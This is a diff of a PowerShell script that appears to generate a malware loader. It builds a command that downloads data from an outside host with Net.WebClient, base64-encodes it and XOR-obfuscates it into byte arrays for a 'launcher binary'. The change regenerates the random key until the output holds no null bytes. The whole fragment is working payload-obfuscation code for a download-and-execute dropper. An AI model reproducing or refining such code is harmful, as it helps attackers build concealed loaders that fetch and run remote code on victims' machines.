@@ -7,12 +7,14 @@ $rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseein
 $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
 $encCmd = [Convert]::ToBase64String($encBytes)
 
-# XOR-obfuscate the base64 command for the launcher binary
+# XOR-obfuscate the base64 command for the launcher binary (no null bytes in output)
 $cmdBytes = [System.Text.Encoding]::UTF8.GetBytes($encCmd)
-$xorKey = @()
-for ($i = 0; $i -lt 32; $i++) { $xorKey += (Get-Random -Min 0 -Max 256) }
-$xored = @()
-for ($i = 0; $i -lt $cmdBytes.Length; $i++) { $xored += $cmdBytes[$i] -bxor $xorKey[$i % 32] }
+do {
+    $xorKey = @()
+    for ($i = 0; $i -lt 32; $i++) { $xorKey += (Get-Random -Min 0 -Max 256) }
+    $xored = @()
+    for ($i = 0; $i -lt $cmdBytes.Length; $i++) { $xored += $cmdBytes[$i] -bxor $xorKey[$i % 32] }
+} while ($xored -contains 0)
 $keyArr = ($xorKey | ForEach-Object { "0x{0:x2}" -f $_ }) -join ", "
 $encArr = ($xored | ForEach-Object { "0x{0:x2}" -f $_ }) -join ", "
 
